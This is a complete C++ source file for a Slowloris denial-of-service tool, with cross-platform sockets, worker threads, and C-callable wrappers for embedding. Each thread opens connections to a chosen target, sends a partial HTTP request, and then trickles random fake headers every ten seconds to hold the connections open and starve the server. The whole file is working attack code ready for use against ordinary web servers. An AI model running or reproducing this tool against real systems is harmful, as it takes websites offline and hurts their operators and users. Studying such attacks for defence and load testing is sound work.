#include "slowloris.hpp"
#include "../config.h"

#include <cstring>
#include <cstdio>
#include <chrono>
#include <random>
#include <sstream>

#ifdef _WIN32
  #define WIN32_LEAN_AND_MEAN
  #include <winsock2.h>
  #include <ws2tcpip.h>
  #pragma comment(lib, "ws2_32.lib")
  typedef SOCKET sock_t;
  #define SOCK_INVALID INVALID_SOCKET
  #define CLOSESOCK closesocket
  static bool g_wsa_init = false;
  static void ensure_wsa() {
      if (!g_wsa_init) {
          WSADATA wsa;
          WSAStartup(MAKEWORD(2, 2), &wsa);
          g_wsa_init = true;
      }
  }
#else
  #include <unistd.h>
  #include <sys/socket.h>
  #include <netinet/in.h>
  #include <arpa/inet.h>
  #include <netdb.h>
  #include <fcntl.h>
  #include <errno.h>
  typedef int sock_t;
  #define SOCK_INVALID (-1)
  #define CLOSESOCK ::close
  static void ensure_wsa() {}
#endif

static const char* SLOW_HEADERS[] = {
    "X-a: %d\r\n",
    "X-b: %d\r\n",
    "X-c: %d\r\n",
    "X-d: %d\r\n",
    "X-e: %d\r\n",
};
static const int NUM_SLOW_HEADERS = 5;

static double now_sec() {
    auto tp = std::chrono::steady_clock::now().time_since_epoch();
    return std::chrono::duration<double>(tp).count();
}

Slowloris::Slowloris(const std::string& target, int duration, int threads, int port,
                     LogCallback callback)
    : m_target(target)
    , m_duration(duration > 0 ? (duration > MAX_DURATION_SECONDS ? MAX_DURATION_SECONDS : duration) : DEFAULT_DURATION)
    , m_num_threads(threads > 0 ? (threads > MAX_THREADS ? MAX_THREADS : threads) : DEFAULT_THREADS)
    , m_port(port > 0 ? port : DEFAULT_PORT)
    , m_callback(std::move(callback))
    , m_stop_flag(false)
    , m_connections_opened(0)
    , m_connections_active(0)
{
    ensure_wsa();
}

Slowloris::~Slowloris() {
    stop();
    for (auto& t : m_workers) {
        if (t.joinable()) t.join();
    }
}

void Slowloris::log(const std::string& msg) {
    if (m_callback) m_callback(msg);
}

void Slowloris::stop() {
    m_stop_flag.store(true);
}

void Slowloris::worker(int thread_id) {
    std::mt19937 rng((unsigned)thread_id ^ (unsigned)std::chrono::steady_clock::now().time_since_epoch().count());
    std::uniform_int_distribution<int> dist(1, 9999);

    auto deadline = std::chrono::steady_clock::now() + std::chrono::seconds(m_duration);

    /* Resolve target */
    struct sockaddr_in addr;
    std::memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons((unsigned short)m_port);

    struct addrinfo hints, *res = nullptr;
    std::memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    if (getaddrinfo(m_target.c_str(), nullptr, &hints, &res) != 0 || !res) {
        return;
    }
    addr.sin_addr = ((struct sockaddr_in*)res->ai_addr)->sin_addr;
    freeaddrinfo(res);

    while (!m_stop_flag.load() && std::chrono::steady_clock::now() < deadline) {
        /* Open a new connection */
        sock_t s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (s == SOCK_INVALID) {
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
            continue;
        }

        /* Set timeouts */
#ifdef _WIN32
        DWORD tmo = 5000;
        setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, (const char*)&tmo, sizeof(tmo));
        setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tmo, sizeof(tmo));
#else
        struct timeval tv;
        tv.tv_sec = 5;
        tv.tv_usec = 0;
        setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
        setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
#endif

        if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) != 0) {
            CLOSESOCK(s);
            std::this_thread::sleep_for(std::chrono::milliseconds(200));
            continue;
        }

        m_connections_opened.fetch_add(1);
        m_connections_active.fetch_add(1);

        /* Send partial HTTP request */
        std::string initial =
            "GET / HTTP/1.1\r\n"
            "Host: " + m_target + "\r\n"
            "User-Agent: Mozilla/5.0 (compatible; Slowloris)\r\n"
            "Accept: text/html\r\n"
            "Accept-Language: en-US\r\n";

        send(s, initial.c_str(), (int)initial.size(), 0);

        /* Keep connection alive by sending slow headers */
        bool alive = true;
        while (alive && !m_stop_flag.load() && std::chrono::steady_clock::now() < deadline) {
            std::this_thread::sleep_for(std::chrono::seconds(10));

            char hdr[64];
            int idx = dist(rng) % NUM_SLOW_HEADERS;
            int val = dist(rng);
            snprintf(hdr, sizeof(hdr), SLOW_HEADERS[idx], val);

            int sent = send(s, hdr, (int)strlen(hdr), 0);
            if (sent <= 0) {
                alive = false;
            }
        }

        CLOSESOCK(s);
        m_connections_active.fetch_sub(1);
    }
}

std::map<std::string, std::string> Slowloris::run() {
    char msg[256];
    snprintf(msg, sizeof(msg), "[Slowloris] Starting %d connections for %ds against %s:%d",
             m_num_threads, m_duration, m_target.c_str(), m_port);
    log(msg);

    double start = now_sec();

    m_workers.reserve(m_num_threads);
    for (int i = 0; i < m_num_threads; i++) {
        m_workers.emplace_back(&Slowloris::worker, this, i);
    }

    for (auto& t : m_workers) {
        if (t.joinable()) t.join();
    }

    double end = now_sec();

    std::map<std::string, std::string> results;
    results["connections_opened"] = std::to_string(m_connections_opened.load());
    results["connections_active"] = std::to_string(m_connections_active.load());
    results["start_time"]         = std::to_string(start);
    results["end_time"]           = std::to_string(end);
    results["duration"]           = std::to_string(end - start);

    snprintf(msg, sizeof(msg), "[Slowloris] Finished: %lld connections opened",
             (long long)m_connections_opened.load());
    log(msg);

    return results;
}

/* ---- extern "C" wrappers ---- */

static slowloris_log_fn g_sl_log_fn = nullptr;
static void sl_log_bridge(const std::string& msg) {
    if (g_sl_log_fn) g_sl_log_fn(msg.c_str());
}

void *slowloris_create(const char *target, int duration, int threads, int port,
                       slowloris_log_fn log_cb) {
    g_sl_log_fn = log_cb;
    auto *sl = new Slowloris(target, duration, threads, port,
                             log_cb ? sl_log_bridge : Slowloris::LogCallback{});
    return (void*)sl;
}

slowloris_stats_t slowloris_run(void *handle) {
    slowloris_stats_t stats = {};
    if (!handle) return stats;
    auto *sl = (Slowloris*)handle;
    auto results = sl->run();
    stats.connections_opened = std::stoll(results["connections_opened"]);
    stats.connections_active = std::stoll(results["connections_active"]);
    stats.start_time         = std::stod(results["start_time"]);
    stats.end_time           = std::stod(results["end_time"]);
    return stats;
}

void slowloris_stop(void *handle) {
    if (handle) ((Slowloris*)handle)->stop();
}

void slowloris_destroy(void *handle) {
    if (handle) delete (Slowloris*)handle;
}
